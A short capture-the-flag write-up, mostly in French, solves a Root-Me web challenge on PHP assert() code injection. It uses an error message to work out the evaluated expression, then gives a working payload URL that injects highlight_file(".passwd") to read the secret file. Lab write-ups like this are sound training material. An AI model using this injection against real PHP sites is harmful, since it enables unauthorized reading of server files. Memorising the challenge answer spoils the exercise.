# Description
```
Statement
Find and exploit the vulnerability to read the file .passwd.
```
# Exploit
- Premierement je vais tenter de provoquer une erreur de syntaxe donc je rajoute une quote
```
http://challenge01.root-me.org/web-serveur/ch47/?page=contact'
```
- Un message d'erreur apparait :
```
Parse error: syntax error, unexpected T_CONSTANT_ENCAPSED_STRING in /challenge/web-serveur/ch47/index.php(8) : assert code on line 1 Catchable fatal error: assert(): Failure evaluating code: strpos('includes/about'.php', '..') === false in /challenge/web-serveur/ch47/index.php on line 8
```
- Ce message d'erreur nous montre clairement la structure que doit avoir notre injection :
```
strpos('includes/about'.php', '..') === false 
```
- Soit du style :
```
strpos('includes/' . $_GET['page'] . '.php', '..') === false
```
- De plus on sait qu'on doit lire le fichier .passwd donc on va tout simplement remplacer ``' . $_GET['page'] . '`` par notre injection, ce qui donne 
```
http://challenge01.root-me.org/web-serveur/ch47/?page='.highlight_file(".passwd").'
 ```